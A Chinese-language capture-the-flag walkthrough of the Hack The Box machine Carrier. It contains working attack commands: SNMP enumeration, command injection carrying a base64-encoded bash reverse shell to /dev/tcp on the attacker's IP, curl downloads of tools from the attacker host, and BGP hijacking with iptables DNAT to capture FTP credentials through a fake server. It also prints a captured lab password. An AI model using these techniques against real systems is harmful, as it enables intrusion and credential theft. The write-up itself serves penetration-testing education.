# 【HTB靶场系列】靶机Carrier的渗透测试

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzU1NjgzOTAyMg==&mid=2247484382&idx=1&sn=8149d7b2944847bdf7d96b1cb0b0f126&chksm=fc3fbadfcb4833c917a195eb64bd5a9b712c2c55ae1cbb5a84e3bd5bb81df6ddb0e01e68b530&scene=126&sessionid=1681572566#rd](http://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247484382&idx=1&sn=8149d7b2944847bdf7d96b1cb0b0f126&chksm=fc3fbadfcb4833c917a195eb64bd5a9b712c2c55ae1cbb5a84e3bd5bb81df6ddb0e01e68b530&scene=126&sessionid=1681572566#rd)

Hack The Box是一个CTF挑战靶机平台，在线渗透测试平台。它能帮助你提升渗透测试技能和黑盒测试技能，它包含了一些不断更新的挑战，其中有模拟真实世界场景，也有倾向于CTF风格的挑战。

**https://www.hackthebox.eu/**

![](../Images/c87c2a4856997ceff9b7c0455f205b88.png)

平台上有很多靶机，从易到难，黑客每入侵一台机器都会获得相应积分，通过积分排名设有名人堂。今天要实验的是靶机Carrier。

![](../Images/e6860e1030e61b7ae17706b096c6012c.png)

目标靶机IP：10.10.10.105

本机IP：10.10.13.133

首先利用Nmap对目标靶机进行信息收集

1. nmap -sC -F -sV 10.10.10.105  

\-sC：通过默认脚本进行扫描

\-sV：扫描目标主机端口上运行软件的版本

\-F：扫描100个最有可能开放的端口

![](../Images/bb38a058b624b02ba41271901c33fbde.png)

显示靶机开放了21，22，80，3306端口，但是21，3306端口被过滤了。22端口是SSH需要登陆，我们先从80端口开始看看能不能得到有用的信息

先打开网页，是一个登陆页面，有2个Error提示45007，45009，去Google查询类似的关键词发现没有什么可用信息，应该是自定义的WEB框架，

![](../Images/cf15f13e7b56a80440cf0792f888f943.png)

我们用gobuster来进行目录爆破

1. gobuster  -u http://10.10.10.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -q  

![](../Images/a6e3397986e93df0caae6cd20cb747a6.png)

先看下tools

**/****tools:**

![](../Images/0f343fc1e94564adf12c1fd084c3dcf4.png)

![](../Images/2f1b173c8d685fb6edc06334d0899175.png)

点进去显示“许可过期，正在退出”  

 

看下doc

 

**/doc：**

![](../Images/b9aee73c83156371d28578c32d438535.png)

![](../Images/52c4c6d1d4020774a8ddc79e37513d2c.png)

![](../Images/e3b3df2a8861d01f748a94b68f710827.png)

一个网络架构图还有一个是错误代码描述的PDF，根据刚刚网页提示的错误代码我们查下对应的解释

Error 4005：守护进程没有响应

Error 4009：配置中没有设置默认的用户名和密码（查看机箱序列号）

 

看下/debug

![](../Images/a8ac3a1f229f4eb1d35ecfe150f54190.png)

没有什么特别有用的信息

 

根据那种图可能还有别的设备，这样我想起了snmp服务

所以我们扫下靶机UDP的端口看看有没有什么有用的信息

1. nmap -sU 10.10.10.105  

![](../Images/e3fab351ee8ed2aa8bd663e72c8f93b1.png)

果然目标机器是有开启snmp，那么我们用snmpwalk来进行弱口令利用

 

1. snmpwalk -v 1 -c **public** 10.10.10.105  

![](../Images/dbc7a79a8e20e65d063a017e0a76042e.png)

这个NET\_45JDX23可能就是所谓的序列号

我们回到登陆进行登陆。

Username:尝试常见的默认用户名:admin, root…..

Password: NET\_45JDX23

![](../Images/7c1d826d2dd07fcaad46a462b1d6b87e.png)

页面显示我们的凭证是无效的

![](../Images/81934aacca0ac3bdc70093992062f8fb.png)

我们进入Tickets

![](../Images/a5ab17a3ec2f278b4896deea2b075028.png)

通过这条信息 我们知道了3个网段（大概就是刚刚那个网络架构图），还有一个FTP：10.120.15.0/24

 

然后我们在点Diagnosticd，提示我们凭证无效，但是可以使用检查功能

点下Verify status

![](../Images/eed4f06d361fbf2c302e0690bacf563f.png)

这个部分很像是远程命令执行。

 

我们用BURP抓包看下信息

![](../Images/5d7f277d15815d3c7c7038ea7ec8382f.png)

Check用base64转换下

![](../Images/8a2e9dc710273fd758ee545a59d93bb9.png)

很明显这个quagga就是上面输出信息的一部分，查找相关资料，发现这是一款路由器软件

![](../Images/945b1d2b037fd3ee3fa7ade270cb8b8b.png)

那么我们设置对check这个参数进行攻击，我们把root的base64编码写进去

![](../Images/325e1806b3d78ddee3598ca70b99c9d3.png)

![](../Images/2b052c39decf4d7787e005032267ed1d.png)

返回信息如下

![](../Images/d3cf0122595b9bbf48096b2681dcdf01.png)

那么我们在试着输入 root；echo hello

![](../Images/43976d9283c3e96b5afde372f40da9f9.png)

![](../Images/a2757119b541f09d2323298cb101b470.png)

如图发现我们是可以用;进行多语句的执行，那么我们用bash反弹一个shell

现在用kali监听下9001

![](../Images/b201f54e906aa7130e69ea15b5744ed5.png)

然后转换下编码

![](../Images/df46862c6c4591452f9123b0369588d2.png)

这里输出cm9vdDtiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjEzLjEzMy85MDAxIDA+JjE=

 

需要注意的是需要把里面的+和=进入URL编码转换才行要不然会出错

![](../Images/6f8c1759340773b5f326453b1e859a7b.png)

这样我们就得到一个shell了

![](../Images/507ae096495e3e615343c652efb26ec4.png)

这样我们就可以得到user的flag了

![](../Images/78a94b8ea087edf13981cf7519183531.png)

接下来就是获得根ROOT的权限

 

从之前的信息我们了解到有一台FTP服务器：10.120.15.0/24

我们试着ping 10.120.15.1看看能不能ping通

![](../Images/834388102cea0f668490c20a295c8fd1.png)

我们需要在靶机上进行扫描，当然你可以用msf添加路由的方式扫描，这里我用另一个种方法把nmap的二进制静态执行文件上传到靶机进行扫描

 

Github：https://github.com/andrew-d/static-binaries

![](../Images/feb4531058f8fda59a1674cc3d79abb2.png)

然后我们用python的SimpleHTTPServer模块建立服务然后靶机去下载这个文件

![](../Images/da1e3aaa82de7f67fbc6598d632ce423.png)

然后再靶机分别输入如下命令

1. curl http://10.10.13.133:8000/nmap -o nmap  

2. chmod +x nmap  

![](../Images/03559c8be5564fc4084cafd9e1c64383.png)

然后我们执行

1. ./nmap -p 21 10.120.15.0/24  

![](../Images/6e407e804fda05a0b62ab556244d7b52.png)

发现没有探测到，可能是目标禁止ICMP数据包

 

 

那么我们加个\-Pn参数，同时把结果导出

1. ./nmap -Pn -vvv -p 21 10.120.15.0/24  \--open

\-Pn：不进行ping直接扫描

\-vvv：显示详细过程

\--open：只显示端口open状态信息

![](../Images/b7b38ad66de178a13a98de3312912395.png)

我们发现 10.120.15.10是开放21端口的

 

然后我们尝试下FTP匿名登陆，登陆的时候可能不会有回显，需要自己打

![](../Images/f1e2eb0b09c354bb651781e0053a80f2.png)

无法执行，之前那个ticks也说这个FTP出现了问题。

 

 

我们需要通过劫持BGP欺骗AS200将数据传输给我们的靶机，然后开启假的FTP服务，之前的信息有显示到有人会定期访问这个FTP，这样我们就可以窃取到凭证

![](../Images/e969f2a79c669eb877585d7b510f46db.png)

![](../Images/8ce516b925a77152ccb7b9c81cd903d0.png)

现在的情况大概就是图上这个样子

 

我们在终端分别输入 

1. vtysh  （quagga的命令）  

2. configure terminal（进入配置模式）  

3. **do** show run （显示配置信息）  

![](../Images/50ad33fe2f66a76bf351cb403bf7600a.png)

我们需要增加一个network就是把刚刚FTP的那个网段加进来

 

这里我直接编辑/etc/ quagga下的bgpd.conf文件内容也就上面显示的内容

![](../Images/ceef560580b81b3a0873c9ac1da8dcb3.png)

我们在自己的kali上编辑下内容在里面加一条10.120.15.0/25

![](../Images/4bed6ee9df66d0864847a7084e8b939a.png)

然后用python的SimpleHTTPServer服务上传到靶机里面去跟nmap一样

把之前的文件重命名，然后把我们的文件下载下来

1. curl http://10.10.13.133:8000/bgpd.conf -o bgpd.con  

![](../Images/2ae04b4ff18eaaca285d8c5202618eb9.png)

然后在iptales上添加记录并重启quagga服务

1. iptables -t nat -A PREROUTING -p tcp --dport 21 -j DNAT --to-destination 10.10.14.65:21   

2. iptables -t nat -A POSTROUTING -j MASQUERADE 

3. service quagga restart 

然后我们在下载一个假的ftp监听21端口来得到凭证

Github：https://github.com/b1ngda0/FtpServicePython/

![](../Images/8d40f59def0d0e4953427b260a9ba836.png)

不久后就能得到账号密码

root:BGPtelc0rout1ng

然后ssh登陆并得到root flag

![](../Images/ed87c84eb5f133f258a47126a3786906.png)

![](../Images/ad23a3a3b7afd90e2737f8bc96b85088.png)
